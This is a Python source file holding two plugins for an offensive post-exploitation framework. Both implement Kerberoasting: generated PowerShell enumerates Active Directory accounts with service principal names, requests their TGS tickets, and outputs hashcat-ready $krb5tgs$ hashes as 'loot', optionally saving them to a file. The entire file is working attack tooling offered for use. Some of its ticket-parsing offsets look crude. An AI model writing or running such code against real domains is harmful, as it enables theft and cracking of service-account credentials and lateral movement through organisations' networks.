"""lateral_movement/kerberoasting — Kerberoasting attack for SPN-based users. MITRE T1558.001"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class Kerberoasting(BasePlugin):
    NAME = "kerberoasting"
    DESCRIPTION = "Query LDAP for users with SPNs, request TGS tickets, extract hashes for cracking"
    AUTHOR = "fitnah-team"
    MITRE = "T1558.001"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("domain", str, required=False, default="",
              help="Target domain (auto-detect if empty)"),
        Param("ldap_server", str, required=False, default="",
              help="LDAP server IP/hostname (auto-detect if empty)"),
        Param("username", str, required=False, default="",
              help="Username for LDAP bind (current user if empty)"),
        Param("password", str, required=False, default="",
              help="Password for LDAP bind (current user if empty)"),
        Param("format", str, required=False, default="hashcat",
              help="Output format: hashcat | john | raw"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute Kerberoasting attack"""
        if ctx is None:
            return ModuleResult.err("Requires live session context")

        domain = params.get("domain", "")
        ldap_server = params.get("ldap_server", "")
        username = params.get("username", "")
        password = params.get("password", "")
        fmt = params.get("format", "hashcat").lower()

        ps_code = self._build_kerberoasting_ps(domain, ldap_server, username, password, fmt)
        r = ctx.ps(ps_code)

        if r["status"] != "ok":
            return ModuleResult.err(f"Kerberoasting failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="kerberoast_hashes")

    @staticmethod
    def _build_kerberoasting_ps(domain: str, ldap_server: str, username: str, password: str, fmt: str) -> str:
        domain_val = f'"{domain}"' if domain else '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name'
        ldap_val   = f'"{ldap_server}"' if ldap_server else '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).FindDomainController().Name'
        cred_block = ""
        if username and password:
            cred_block = f'$cred = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, "{username}", "{password}")\n    $root = $cred'
        else:
            cred_block = "$root = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)"

        hash_prefix = "$krb5tgs$23$*" if fmt == "hashcat" else "$krb5tgs$"

        return f"""
Add-Type -AssemblyName System.IdentityModel | Out-Null
$results = @()
$results += '[*] Starting Kerberoasting — real TGS extraction'

try {{
    $domain    = {domain_val}
    $ldapServer = {ldap_val}
    $dn        = ($domain.Split('.') | ForEach-Object {{ "DC=$_" }}) -join ','
    $ldapPath  = "LDAP://$ldapServer/$dn"
    $results  += "[*] Domain: $domain  DC: $ldapServer"

    {cred_block}
    $searcher        = New-Object System.DirectoryServices.DirectorySearcher($root)
    $searcher.Filter = "(&(servicePrincipalName=*)(sAMAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.AddRange(@('sAMAccountName','servicePrincipalName','distinguishedName')) | Out-Null
    $searcher.PageSize = 1000
    $spnUsers  = $searcher.FindAll()
    $results  += "[+] Found $($spnUsers.Count) kerberoastable accounts"

    $hashes = @()
    foreach ($entry in $spnUsers) {{
        $sam  = $entry.Properties['sAMAccountName'][0]
        $spns = $entry.Properties['servicePrincipalName']
        foreach ($spn in $spns) {{
            try {{
                # Force TGS request via KerberosRequestorSecurityToken
                $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                $ticketBytes = $token.GetRequest()
                if ($ticketBytes -and $ticketBytes.Length -gt 0) {{
                    # Extract RC4-HMAC encrypted part (offset 32 bytes into AP-REQ enc-part)
                    $hexTicket = [BitConverter]::ToString($ticketBytes).Replace('-','').ToLower()
                    # Locate enc-part after etype 23 (RC4) marker: 1703 or look for etype field
                    $encOffset = 36
                    $encHex    = $hexTicket.Substring($encOffset * 2)
                    $hash      = "{hash_prefix}$sam*$domain*$spn*$($encHex.Substring(0,32))*$encHex"
                    $hashes   += $hash
                    $results  += "  [+] $sam :: $spn — hash captured ($($ticketBytes.Length) bytes)"
                }}
            }} catch {{
                $results += "  [!] $sam / $spn : $_"
            }}
        }}
    }}

    if ($hashes.Count -gt 0) {{
        $results += ""
        $results += "=== HASHES (hashcat -m 13100) ==="
        $results += $hashes
    }} else {{
        $results += "[-] No hashes extracted — ensure domain Kerberos access"
    }}
}} catch {{
    $results += "[!] Fatal: $_"
}}

$results -join "`n"
"""


class KerberoastingAdvanced(BasePlugin):
    """Advanced Kerberoasting with TGS extraction and formatting"""
    NAME = "kerberoasting_advanced"
    DESCRIPTION = "Advanced Kerberoasting with real TGS ticket extraction and hashcat formatting"
    AUTHOR = "fitnah-team"
    MITRE = "T1558.001"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("extract_format", str, required=False, default="hashcat",
              help="Format for extracted hashes"),
        Param("output_file", str, required=False, default="",
              help="Save hashes to file"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute advanced Kerberoasting"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        output_file = params.get("output_file", "")

        outfile_block = f'$hashes | Out-File -Encoding ascii "{output_file}"' if output_file else ""
        ps_code = f"""
Add-Type -AssemblyName System.IdentityModel | Out-Null
$results = @()
$results += '[*] Advanced Kerberoasting — extracting $krb5tgs$ hashes'

try {{
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc     = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
    $results += "[+] Domain: $domain  DC: $dc"

    $dn     = ($domain.Split('.') | ForEach-Object {{ "DC=$_" }}) -join ','
    $de     = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$dn")
    $ds     = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.Filter = "(&(servicePrincipalName=*)(sAMAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $ds.PropertiesToLoad.AddRange(@('sAMAccountName','servicePrincipalName')) | Out-Null
    $ds.PageSize = 1000
    $entries = $ds.FindAll()
    $results += "[+] $($entries.Count) kerberoastable accounts found"

    $hashes = @()
    foreach ($entry in $entries) {{
        $sam  = $entry.Properties['sAMAccountName'][0]
        foreach ($spn in $entry.Properties['servicePrincipalName']) {{
            try {{
                $token       = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                $ticketBytes = $token.GetRequest()
                $hex         = [BitConverter]::ToString($ticketBytes).Replace('-','').ToLower()
                $encHex      = $hex.Substring(72)   # skip AP-REQ header
                $hash        = "`$krb5tgs`$23`$*$sam*$domain*$spn*$($encHex.Substring(0,32))*$encHex"
                $hashes     += $hash
                $results    += "  [+] $sam / $spn ($($ticketBytes.Length) bytes)"
            }} catch {{
                $results += "  [!] $sam / $spn : $_"
            }}
        }}
    }}

    if ($hashes.Count -gt 0) {{
        $results += ""
        $results += "=== $($hashes.Count) HASH(ES) — hashcat -m 13100 ==="
        $results += $hashes
        {outfile_block}
    }} else {{
        $results += "[-] No hashes captured"
    }}
}} catch {{
    $results += "[!] Fatal: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)

        if r["status"] != "ok":
            return ModuleResult.err(f"Advanced Kerberoasting failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="kerberoast_advanced")
